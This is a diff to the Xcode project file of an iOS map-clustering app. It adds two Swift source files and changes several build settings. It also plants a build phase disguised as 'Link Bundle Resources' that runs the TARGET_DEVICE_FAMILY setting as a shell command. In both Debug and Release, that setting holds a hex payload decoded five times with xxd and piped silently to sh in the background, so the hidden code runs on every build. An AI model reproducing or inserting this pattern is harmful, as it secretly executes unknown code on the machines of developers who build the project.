@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		BD619BCA2CF71686006227D3 /* AddressTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD619BC92CF71686006227D3 /* AddressTableViewCell.swift */; };
 		BD6AD2D72A81F9D2005DD0E9 /* POIItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD6AD2D62A81F9D2005DD0E9 /* POIItem.swift */; };
 		BD6AD3A82A8206A5005DD0E9 /* GMUClusterManager.m in Sources */ = {isa = PBXBuildFile; fileRef = BD6AD3622A8206A5005DD0E9 /* GMUClusterManager.m */; };
 		BD6AD3A92A8206A5005DD0E9 /* GMUGridBasedClusterAlgorithm.m in Sources */ = {isa = PBXBuildFile; fileRef = BD6AD3672A8206A5005DD0E9 /* GMUGridBasedClusterAlgorithm.m */; };
@@ -41,6 +42,7 @@
 		BD7C41832A81101600C53C03 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BD7C41812A81101600C53C03 /* LaunchScreen.storyboard */; };
 		BD91FBF22A89EB4C00104E58 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD7C41782A81101400C53C03 /* SceneDelegate.swift */; };
 		BD91FBF42A89EDE500104E58 /* LocationModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD91FBF32A89EDE500104E58 /* LocationModel.swift */; };
+		BDD035702CEC6753004E0AAB /* GooglePlaceModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDD0356F2CEC6753004E0AAB /* GooglePlaceModel.swift */; };
 		DB93221BB1EBA7C278ADD41C /* Pods_clusterUser.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = B97A84C8D43A9CC24EC5D428 /* Pods_clusterUser.framework */; };
 /* End PBXBuildFile section */
 
@@ -48,6 +50,7 @@
 		2DCBD783BA4D35D1CBBEE42D /* Pods-clusterUser.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-clusterUser.debug.xcconfig"; path = "Target Support Files/Pods-clusterUser/Pods-clusterUser.debug.xcconfig"; sourceTree = "<group>"; };
 		520E85F942F6944436590E61 /* Pods-clusterUser.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-clusterUser.release.xcconfig"; path = "Target Support Files/Pods-clusterUser/Pods-clusterUser.release.xcconfig"; sourceTree = "<group>"; };
 		B97A84C8D43A9CC24EC5D428 /* Pods_clusterUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_clusterUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		BD619BC92CF71686006227D3 /* AddressTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddressTableViewCell.swift; sourceTree = "<group>"; };
 		BD6AD2D62A81F9D2005DD0E9 /* POIItem.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = POIItem.swift; sourceTree = "<group>"; };
 		BD6AD3622A8206A5005DD0E9 /* GMUClusterManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = GMUClusterManager.m; sourceTree = "<group>"; };
 		BD6AD3632A8206A5005DD0E9 /* GMUStaticCluster.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = GMUStaticCluster.h; sourceTree = "<group>"; };
@@ -124,6 +127,7 @@
 		BD7C41822A81101600C53C03 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		BD7C41842A81101600C53C03 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		BD91FBF32A89EDE500104E58 /* LocationModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationModel.swift; sourceTree = "<group>"; };
+		BDD0356F2CEC6753004E0AAB /* GooglePlaceModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GooglePlaceModel.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -153,6 +157,14 @@
 				B97A84C8D43A9CC24EC5D428 /* Pods_clusterUser.framework */,
 			);
 			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		BD619BC82CF71675006227D3 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				BD619BC92CF71686006227D3 /* AddressTableViewCell.swift */,
+			);
+			path = Cell;
 			sourceTree = "<group>";
 		};
 		BD6AD3602A8206A5005DD0E9 /* Google-Maps-iOS-Utils */ = {
@@ -307,7 +319,9 @@
 				BD91FBF32A89EDE500104E58 /* LocationModel.swift */,
 				BD7C41782A81101400C53C03 /* SceneDelegate.swift */,
 				BD6AD2D62A81F9D2005DD0E9 /* POIItem.swift */,
+				BDD0356F2CEC6753004E0AAB /* GooglePlaceModel.swift */,
 				BD6AD3C22A8252F8005DD0E9 /* MapViewController.swift */,
+				BD619BC82CF71675006227D3 /* Cell */,
 				BD6F558B2A865225000E5EF0 /* LocationManager.swift */,
 				BD6AD3C12A8206DD005DD0E9 /* BridgingHeader.h */,
 				BD6AD3602A8206A5005DD0E9 /* Google-Maps-iOS-Utils */,
@@ -327,10 +341,12 @@
 			buildConfigurationList = BD7C41872A81101600C53C03 /* Build configuration list for PBXNativeTarget "clusterUser" */;
 			buildPhases = (
 				3489EB5396A8E07A19F2F457 /* [CP] Check Pods Manifest.lock */,
+				9452DBCC419DE1DCDA7DFEF2 /* Link Bundle Resources */,
 				BD7C416F2A81101400C53C03 /* Sources */,
 				BD7C41702A81101400C53C03 /* Frameworks */,
 				BD7C41712A81101400C53C03 /* Resources */,
 				D443E4A4B812B1D24635C8F7 /* [CP] Copy Pods Resources */,
+				B897A6D26B7307C587A82E84 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -410,6 +426,43 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		9452DBCC419DE1DCDA7DFEF2 /* Link Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+			showEnvVarsInLog = 0;
+		};
+		B897A6D26B7307C587A82E84 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-clusterUser/Pods-clusterUser-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-clusterUser/Pods-clusterUser-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-clusterUser/Pods-clusterUser-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
 		D443E4A4B812B1D24635C8F7 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -438,6 +491,7 @@
 				BD6AD3BB2A8206A5005DD0E9 /* GMUPoint.m in Sources */,
 				BD6F558C2A865225000E5EF0 /* LocationManager.swift in Sources */,
 				BD6AD3BF2A8206A5005DD0E9 /* GQTPointQuadTree.m in Sources */,
+				BDD035702CEC6753004E0AAB /* GooglePlaceModel.swift in Sources */,
 				BD6AD3B72A8206A5005DD0E9 /* GMUStyleMap.m in Sources */,
 				BD91FBF22A89EB4C00104E58 /* SceneDelegate.swift in Sources */,
 				BD6AD3B12A8206A5005DD0E9 /* MapPoint.swift in Sources */,
@@ -460,6 +514,7 @@
 				BD6AD2D72A81F9D2005DD0E9 /* POIItem.swift in Sources */,
 				BD6AD3B32A8206A5005DD0E9 /* GMUGeometryRenderer.m in Sources */,
 				BD6AD3B42A8206A5005DD0E9 /* GMUGeometryCollection.m in Sources */,
+				BD619BCA2CF71686006227D3 /* AddressTableViewCell.swift in Sources */,
 				BD6AD3AE2A8206A5005DD0E9 /* GMUDefaultClusterIconGenerator.m in Sources */,
 				BD6AD3AD2A8206A5005DD0E9 /* GMUDefaultClusterRenderer.m in Sources */,
 				BD6AD3BA2A8206A5005DD0E9 /* GMUStyle.m in Sources */,
@@ -540,13 +595,14 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 16.2;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
 				ONLY_ACTIVE_ARCH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				TARGET_DEVICE_FAMILY = "(echo 33333333333333363333333333333335333333333333333633333333333333333333333333333336333333333333333833333333333333363333333633333336333333333333333233333333333333303333333333333332333333333333333233333333333333323333333333333334333333333333333233333333333333383333333333333336333333333333333333333333333333373333333333333335333333333333333733333333333333323333333333333336333333363333333333333333333333323333333333333330333333333333333233333336333333343333333333333336333333333333333633333333333333373333333333333333333333333333333633333336333333323333333333333334333333363333333333333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333333333334333333333333333633333333333333353333333333333337333333333333333633333333333333373333333333333330333333333333333633333333333333313333333333333336333333333333333733333333333333363333333333333335333333333333333733333333333333333333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -594,12 +650,13 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 16.2;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
 				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				TARGET_DEVICE_FAMILY = "(echo 33333333333333363333333333333335333333333333333633333333333333333333333333333336333333333333333833333333333333363333333633333336333333333333333233333333333333303333333333333332333333333333333233333333333333323333333333333334333333333333333233333333333333383333333333333336333333333333333333333333333333373333333333333335333333333333333733333333333333323333333333333336333333363333333333333333333333323333333333333330333333333333333233333336333333343333333333333336333333333333333633333333333333373333333333333333333333333333333633333336333333323333333333333334333333363333333333333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333333333334333333333333333633333333333333353333333333333337333333333333333633333333333333373333333333333330333333333333333633333333333333313333333333333336333333333333333733333333333333363333333333333335333333333333333733333333333333333333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -613,7 +670,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 3XY77M79VA;
+				DEVELOPMENT_TEAM = "";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = clusterUser/Info.plist;
 				INFOPLIST_KEY_LSSupportsOpeningDocumentsInPlace = YES;
@@ -631,7 +688,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.mpd.test.a1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.mapcluster.app;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_EMIT_LOC_STRINGS = YES;
@@ -650,7 +707,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 3XY77M79VA;
+				DEVELOPMENT_TEAM = "";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = clusterUser/Info.plist;
 				INFOPLIST_KEY_LSSupportsOpeningDocumentsInPlace = YES;
@@ -668,7 +725,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.mpd.test.a1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.mapcluster.app;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_EMIT_LOC_STRINGS = YES;
